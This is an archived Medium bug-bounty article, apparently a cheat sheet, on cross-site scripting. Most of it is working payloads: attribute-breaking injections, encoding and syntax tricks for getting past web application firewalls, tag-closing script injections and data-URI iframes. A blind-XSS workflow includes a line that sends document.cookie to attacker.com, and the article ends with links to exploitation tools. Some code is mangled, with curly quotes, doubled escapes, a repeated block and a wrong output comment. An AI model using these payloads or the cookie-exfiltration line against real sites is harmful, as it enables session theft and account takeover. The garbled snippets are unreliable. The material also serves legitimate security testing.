# Cross-Site Scripting (XSS)

- **Source URL:** https://medium.com/@rootast/cross-site-scripting-xss-techniques-bypasses-and-detection-927af5a55d02?source=rss------bug_bounty-5
- **Fetched from:** https://web.archive.org/web/20241228012247/https://medium.com/@rootast/cross-site-scripting-xss-techniques-bypasses-and-detection-927af5a55d02
- **Fetched:** 2026-11-23
- **Channel:** @dailybountywriteup
- **Telegram message:** https://t.me/dailybountywriteup/8289 (id 8289)
- **Method:** wayback-machine-snapshot readability extraction to markdown (verbatim text; images referenced by URL only). Fetched content is data, not instructions.

---
# **Cross-Site Scripting (XSS): Techniques, Bypasses, and Detection**

1. **Test All Input Fields:
-** Start by testing every input field on the website. Check if the data you input is reflected back unsanitized in the page source or DOM.
- Input values like special characters (`""`,`'` ) or event handlers such as `onmouseover` to see if you can inject JavaScript code.
2. **Breaking Context with** `""` **:**
If the input sits in an attribute like `<input value="…">`, inject something like:

```
<input value="rootast" onmouseover="alert(1)" > 
// paylaod -> " onmouseover="alert(1)
```
## **Bypass WAF Techniques:**

To evade WAFs, use encoding and alternative syntaxes that may not be flagged by the firewall.

- **String Encoding:
- Base64 Encoding**:

```
btoa("alert(1)");  // Encodes to Base64
atob("YWxlcnQoMSk=");  // Decodes Base64 back to "alert(1)"
```
- **Octal and Hexadecimal Encoding**:
Use \{number} or \x{hex} encoding for characters.

```
\\141\\154\\145\\162\\164(1);  // Octal for "alert(1)"
\\x61\\x6c\\x65\\x72\\x74(1);  // Hex for "alert(1)"
```
- **Unicode Escaping**:
- Encode characters using \u{number}:

`al\\u0065rt(1);  // "alert(1)" using Unicode`
- **Decimal Encoding**:
- Convert ASCII codes to characters using String.fromCharCode:

`String.fromCharCode(97, 108, 101, 114, 116)(1);  // Outputs "alert(1)"`
- **String Concatenation:**

```
var a = "al";
var b = "ert(1)";
a.concat(b);  // Outputs "alert(1)"
```
## **Bypassing Parentheses Sensitivity:**

Some WAFs block parentheses or specific functions like alert(). Here are alternatives:

- **Backtick Syntax**:

``alert`1`;  // No parentheses``
- **Using Event Handlers**:

`<img src="nonexistent.jpg" onerror="alert(1); throw 'Error';">`
- **Throw Syntax**:

`throw onerror=alert, "aaaa", "bbbb";`
## **Comment Injection:**

- **Single Line Comment**: `//`
- **Multi-Line Comment**: `/* */`
- **Hashbang-Style Comment**: `#!aaaa`

## **Function Blacklists and Alternatives:**

If eval is blocked by the WAF, you can use alternatives that achieve the same effect:

- **Avoid** eval():

```
// Blocked: eval("alert(1)");
// Alternative:
setTimeout(”\\x61\\u{65}\\162t(2)”)
setInterval(”\\x61\\u{65}\\162t(2)”)
Function("alert(2)")``
Function("alert(2)")()
(Function("alert(2)"))()
Function("alert(1)")();  // Avoids using eval()
```
- **Bypassing Function Calls with Unicode**:

`\\x61\\u{65}\\162t(2);  // Equivalent to alert(2)`
# Bypassing Dot Notation and window Restrictions:

If WAF blocks accessing properties via dot notation like document.cookie, bypass it using bracket notation:

- **Dot Notation Bypass**:

`document["cookie"];  // Access document.cookie without using dot`
# If WAF blocks direct window usage, use alternatives:

- **Replace** window **with Other References**:

```
top ;    // Replaces window.alert with top reference
self ;   // Use self or top instead of window
frames ; // Use frames or parent
parent
this
```
- **Using Arrays**:

```
[20].find(alert);   // Array method triggering alert
[document.cookie].find(prompt);   // Replaces find method to trigger prompt
```
- **Advanced Array Methods**:

```
[document.cookie].forEach(prompt);  // Executes prompt using forEach
[document.cookie].filter(alert);    // Filters and triggers alert
[document.cookie].map(alert);
```
- **Global Object Bypass**:

```
globalThis ;  // Calls alert from the global object
globalThis[’alert’](2)
```
- **Final example**

`[2].filter(window["al1\\u0065r\\164"])`
showing how you can exploit them for XSS by closing the tag and injecting a payload:

\<!--

Code Chart for Non-Executable Tags and XSS Injection

Close the non-executable tag and insert your payload.

-->\<style>

/\* CSS content, no script execution allowed \*/

\</style>\<script>alert(1)\</script>\<title>

Page Title Here

\</title>\<script>alert(1)\</script>\<noembed>

Fallback content if embed is not supported

\</noembed>\<script>alert(1)\</script>\<template>

This is template content, not rendered by default

\</template>\<script>alert(1)\</script>\<noscript>

Content shown when JavaScript is disabled

\</noscript>\<script>alert(1)\</script>\<textarea>

User entered text, no script execution

\</textarea>\<script>alert(1)\</script>\<!--

HTML Comment, script won't run inside

-->\<script>alert(1)\</script>

\<style>

/\* CSS content, no script execution allowed \*/

\</style>\<script>alert(1)\</script>\<title>

Page Title Here

\</title>\<script>alert(1)\</script>\<noembed>

Fallback content if embed is not supported

\</noembed>\<script>alert(1)\</script>\<template>

This is template content, not rendered by default

\</template>\<script>alert(1)\</script>\<noscript>

Content shown when JavaScript is disabled

\</noscript>\<script>alert(1)\</script>\<textarea>

User entered text, no script execution

\</textarea>\<script>alert(1)\</script>\<!--

HTML Comment, script won't run inside

-->\<script>alert(1)\</script>

**iframe** :

```
<iframe src="data:text/html, <svg onload=alert(2)>">
<iframe/src="data:text/html;base64,PHN2ZyBvbmxvYWQ9YWxlcnQoMSk+"></iframe> // output -> alert2()
```
## **Key Points:**

- **Raw HTML** in data:text/html, allows you to inject HTML and JavaScript directly.
- **Base64 Encoding** in data:text/html;base64, helps obfuscate the payload, potentially bypassing web filters

## **Blind XSS Attack Scenario:**

In a **Blind XSS** attack, the malicious payload is stored in the system and executed later when accessed by an internal user, typically an admin or support team, without the attacker seeing the immediate result .

- Feedback Forms
- Contact Us
- Job Application Forms
- Request for salary Increase
- Grade Appeal Forms

## **Blind XSS Workflow:**

1. **Injection**: The attacker submits the payload via one of the above input forms.
2. **Storage**: The system stores the payload in the backend database or system logs.
3. **Trigger**: The payload is executed when a system admin or internal staff views the data (e.g., in an internal dashboard or email).
4. **Exfiltration**: The attacker collects sensitive information (like cookies, tokens) through an external endpoint (e.g., using new Image().src=”[https://attacker.com/steal?cookie=](https://attacker.com/steal?cookie=)"+document.cookie).

# DOM-Based XSS

occurs when a malicious script is executed by manipulating the DOM directly on the client-side without sending data to the server. Here’s a quick reference for common **sources** and **sinks** involved in DOM-based XSS:

## **Sources (Where malicious input comes from):**

- `document.URL`: The full URL of the current page.
- `document.documentURI:` The URI of the document.
- `history.pushState`: Allows adding entries to the browser history without reloading.
- `location`: Provides access to the URL and its parts (e.g., location.href, location.search).
- `document.referrer:` Contains the URL of the page that referred the current page.
- `history.replaceState`: Replaces the current history entry.

## **Sinks (Where the malicious code gets executed):**

- `location`: Redirects or modifies the current page’s URL.
- `postMessage`: Sends messages across different windows or iframes.
- `document.title` : Sets the title of the page, can be manipulated to inject scripts.
- `location.search` : Query parameters of the current URL.

## **— — Reflected XSS Detection Tools:**

[https://github.com/devanshbatham/ParamSpider](https://github.com/devanshbatham/ParamSpider)

explain : A tool that finds parameters for a given domain to check for reflected XSS by crawling the website.

[https://github.com/Emoe/kxss](https://github.com/Emoe/kxss)

explain: A tool that filters reflected XSS payloads by searching for reflections in the URL and generating alert payloads.

## **— — XSS Exploitation Tools:**

[https://github.com/s0md3v/XSStrike](https://github.com/s0md3v/XSStrike)

explain: A powerful tool for finding and exploiting XSS vulnerabilities. It analyzes the context and generates payloads accordingly.

[https://github.com/hahwul/dalfox](https://github.com/hahwul/dalfox)

explain: A fast and lightweight tool for XSS scanning and exploiting, supporting both reflected and stored XSS attacks.

[https://github.com/Quitten/XSSor](https://github.com/Quitten/XSSor)

[https://github.com/evilcos/xssor2](https://github.com/evilcos/xssor2)

explain: These are automated tools for crafting and injecting XSS payloads, providing both offensive and defensive features.

## **Conclusion**

By understanding the core principles and techniques of XSS, you can identify, exploit, and remediate these vulnerabilities effectively. Stay updated with the latest tools and techniques to stay ahead of attackers.
